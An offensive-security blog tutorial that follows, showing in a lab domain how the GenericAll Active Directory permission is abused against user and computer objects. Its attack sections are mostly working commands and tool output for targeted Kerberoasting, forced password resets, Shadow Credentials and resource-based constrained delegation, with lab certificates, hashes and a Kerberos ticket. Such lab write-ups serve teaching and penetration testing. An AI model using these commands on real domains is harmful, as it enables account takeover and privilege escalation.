---
title: ⚔️DACL - GenericAll
date: 2025-10-28 01:05:00 +/-TTTT
categories: [DACL]
tags: [GenericAll]     # TAG names should always be lowercase
image : /assets/images/genericallbackground.png
---
> Author : lineeralgebra
{:.prompt-tip}

# **GenericAll on User → User**

## **GenericAll on User → User happening why?**

Before start lets learn why is happening? where to check and verify?

We have to open `dsa.msc` → ADUC first and make sure its enabled.

1. Go to the **Security** tab.
    - If you don’t see it: in ADUC, click **View → Advanced Features**, then open Properties again.
2. Click **Advanced**.
    
![alt text](../assets/images/dacl1.png)
    

Now we can go our target to verify

1. We can go our target directly and `right click` and select `Properties`  After u select victim user and check `Permissions` 
    
![alt text](../assets/images/dacl2.png)

When it calls FullControl → GenericAll so its what we said before **Full control over the object**

We also use **dsacls** to set it or understand why is happenning

```bash
dsacls "CN=osman,CN=Users,DC=lab,DC=local" /G lab\irem:GA
```

## **GenericAll on User → User Verify**

### **GenericAll on User → User Verify w PowerView**

Best way to verify **GenericAll** is Bloodhound off course but lets start if we have **PowerView Access**

```bash
powershell-import /home/elliot/tools/PowerView.ps1
```

and check for GenericAll

```bash
powerpick Get-ObjectAcl -Identity "osman" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll" }
```

![alt text](../assets/images/dacl3.png)

now we have to only convert this `SID`  For this we can use [powerview.py](https://github.com/aniqfakhrul/powerview.py) cause its fcking strong tool

```bash
powerview lab.local/'irem:princess'@VALENOR-DC01.lab.local --dc-ip 192.168.1.10 --web --web-host 0.0.0.0 --web-port 3000 --web-auth user:password1234
```

`http://0.0.0.0:3000/utils`

![alt text](../assets/images/dacl4.png)

But its take time right so boring so lets check actually with great tooll i will use for this PART

### **GenericAll on User → User Verify w find-aces**

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

```bash
(.venv) ➜  find-aces git:(main) ✗ python3 main.py --auth "ldap+ntlm-password://lab.local\\irem:princess@VALENOR-DC01.lab.local"

Type 'help' to see available commands.
$ 

```

and just give 

```bash
find_object_aces <username> - Search for ACEs for a specific user                                                                                            
```

![alt text](../assets/images/dacl5.png)

Very strong tool!!!

### **GenericAll on User → User Verify w Bloodhound**

And off course easiest and common way is bloodhound

![alt text](../assets/images/dacl6.png)

## **GenericAll on User → User Attack**

As we said with GenericAll we have `Full control over the object` and we can do Reset user password, add to group, **Kerberoasting etc etc.**

### **GenericAll on User → User Attack Kerberoasting**

**1. T1558.003 – Kerberoasting**

We can use 2 methods here

![alt text](../assets/images/dacl7.png)

with [targetedkerberoast](https://github.com/ShutdownRepo/targetedKerberoast) it will be easy

```bash
python3 targetedKerberoast.py -v -d 'lab.local' -u 'irem' -p 'princess'
```

![alt text](../assets/images/dacl8.png)

also with PowerView we can do easily

```bash
Set-DomainObject -Identity 'irem' -Set @{serviceprincipalname='nonexistent/VALENOR-DC01'}
$User = Get-DomainUser 'osman'
$User | Get-DomainSPNTicket | f1
```

### **GenericAll on User → User Attack Force Change Password**

As we have full privleges and control on target user we can change his/her password directly with bloodyAD which is i always using

https://github.com/CravateRouge/bloodyAD

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u irem -p princess set password osman NewPassword123!
[+] Password changed successfully!
```

or wtih mimikatzz!!! `lsadump::setntlm`

```bash
mimikatz lsadump::setntlm /user:osman /password:VeryStrongPass1! /server:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl9.png)

### **GenericAll on User → User Attack Shadow Credentials attack**

Thats the **BEST** way to do it cause ChangePassword is bad for OPSEC and kerberoasting?? maybe u will not able to crack password.!!!!

We can do easily with [certipy](https://github.com/ly4k/Certipy) btw!!!

```bash
certipy-ad shadow auto -username irem@lab.local -password princess -account osman -dc-ip 192.168.1.10
```

![alt text](../assets/images/dacl10.png)

or with [Whisker.exe](https://github.com/eladshamir/Whisker)!!! u can find here tho

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Whisker.exe

for add on target

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Whisker.exe add /target:osman /domain:lab.local /dc:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl11.png)

it will give us command directly so we will read NTLM hash directly!!!

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe asktgt /user:osman /certificate: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 /password:"DH3cq0i4kZdV1LFk" /domain:lab.local /dc:VALENOR-DC01.lab.local /getcredentials /show
```

![alt text](../assets/images/dacl12.png)

# **GenericAll on User → Computer**

Before start lets learn why is happening? where to check and verify?

We have to open `dsa.msc` → ADUC first and make sure its enabled.

1. Go to the **Security** tab.
    - If you don’t see it: in ADUC, click **View → Advanced Features**, then open Properties again.
2. Click **Advanced**.,Now we can go our target to verify
3. We can go our target directly and `right click` and select `Properties`  After u select victim user and check `Permissions` 
    
![alt text](../assets/images/dacl13.png)
    

When it calls FullControl → GenericAll so its what we said before **Full control over the object**

We also use **dsacls** to set it or understand why is happenning

```bash
dsacls "CN=TROY,CN=Computers,DC=lab,DC=local" /G lab\irem:GA
```

Lets go verify part!!

### **GenericAll on User → Computer Verify w find-aces**

with Powerview it was really **hell** so i will use this great tool directly at this part!!!

https://github.com/L1nvx/find-aces

```bash
Requirements
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama

and usage is easy too!!
python3 main.py --auth "ldap+ntlm-password://LAB\\\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\\\irem@dc.lab.local"

for our lab
(.venv) ➜  find-aces git:(main) ✗ python3 main.py --auth "ldap+ntlm-password://lab.local\\\\irem:princess@VALENOR-DC01.lab.local"

Type 'help' to see available commands.
$ 

and just give
find_object_aces <username> - Search for ACEs for a specific user                                                                                            

```

![alt text](../assets/images/dacl14.png)

### **GenericAll on User → Computer Verify w Bloodhound**

We can also verify really fast with bloodhound off course!!

![alt text](../assets/images/dacl15.png)

it was easy right?

## **GenericAll on User → Computer Attack**

As we said with GenericAll we have `Full control over the object` and we can do RBCD directly and Shadow Credentials attack (w certipy)

### **GenericAll on User → Computer Attack** Shadow Credentials attack

We checked this before and it was really easy with [`certipy`](https://github.com/ly4k/Certipy)

```bash
certipy-ad shadow auto -username irem@lab.local -password princess -account TROY$ -dc-ip 192.168.1.10
```

![alt text](../assets/images/dacl16.png)
or with [Whisker.exe](https://github.com/eladshamir/Whisker)!!! u can find here tho

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Whisker.exe

for add on target

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Whisker.exe add /target:TROY$ /domain:lab.local /dc:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl17.png)

and run this for grab NTLM hash of `TROY$`

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe asktgt /user:TROY$ /certificate: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 /password:"ogCPyWzWumjkzJsL" /domain:lab.local /dc:VALENOR-DC01.lab.local /getcredentials /show
```

![alt text](../assets/images/dacl18.png)

### **GenericAll on User → Computer Attack  Resource-Based Constrained Delegation**

Yes!! thats the another great way and common one!! we can do **RBCD** directly at target computer.

U can find commands here thats also great

![alt text](../assets/images/dacl19.png)

and just use them

```bash
addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host VALENOR-DC01.lab.local -domain-netbios lab.local 'lab.local/irem:princess' 

rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TROY$' -action 'write' 'lab.local/irem:princess'

getST.py -spn 'cifs/TROY.lab.local' -impersonate 'administrator' 'lab.local/attackersystem$:Summer2018!'
```

![alt text](../assets/images/dacl20.png)

Lets do same thing on windows (C2)!!!

1. Lets add computer first!!

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/StandIn.exe --computer Ankara --make --Domain lab.local
```

![alt text](../assets/images/dacl21.png)

1. set RBCD

```bash
powershell-import /home/elliot/tools/PowerView.ps1

powerpick Set-ADComputer TROY -PrincipalsAllowedToDelegateToAccount Ankara$

powerpick Get-ADComputer TROY -Properties PrincipalsAllowedToDelegateToAccount
```

![alt text](../assets/images/dacl22.png)

1. Lets get rc4 hash of attacker computer

```bash
execute-assembly /home/elliot/tools/Rubeus.exe hash /password:V45oa2pZn7Vi3yh /user:Ankara$ /domain:VALENOR-DC01.lab.local
[09/04 13:55:28] [*] Tasked beacon to run .NET program: Rubeus.exe hash /password:V45oa2pZn7Vi3yh /user:Ankara$ /domain:VALENOR-DC01.lab.local
[09/04 13:55:28] [+] host called home, sent: 556370 bytes
[09/04 13:55:28] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[09/04 13:55:28] [+] received output:

[*] Action: Calculate Password Hash(es)

[*] Input password             : V45oa2pZn7Vi3yh
[*] Input username             : Ankara$
[*] Input domain               : VALENOR-DC01.lab.local
[*] Salt                       : VALENOR-DC01.LAB.LOCALhostankara.valenor-dc01.lab.local
[*]       rc4_hmac             : 151974BBAA78135E7AEFFFD2001A057B
[*]       aes128_cts_hmac_sha1 : 0A3D870CE2FD981C42263C9BE7145EE8
[*]       aes256_cts_hmac_sha1 : 2CAC328E2E081C0BD48AC67DD0E87BF681398B4CC77AE1C213D9015B0EE0D929
[*]       des_cbc_md5          : 2F10405E15850483
```

1. Now lets craete ticket for Administrator.

Command to execute:

```bash
execute-assembly /home/elliot/tools/Rubeus.exe s4u /user:Ankara$ /password:V45oa2pZn7Vi3yh /domain:lab.local /impersonateuser:administrator /rc4:151974BBAA78135E7AEFFFD2001A057B /msdsspn:cifs/TROY.lab.local /nowrap
```

![alt text](../assets/images/dacl23.png)

lets convert with

```bash
echo -n "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" | base64 -d > ticket.kirbi

ticketConverter.py ticket.kirbi ticket.cache
```

![alt text](../assets/images/dacl24.png)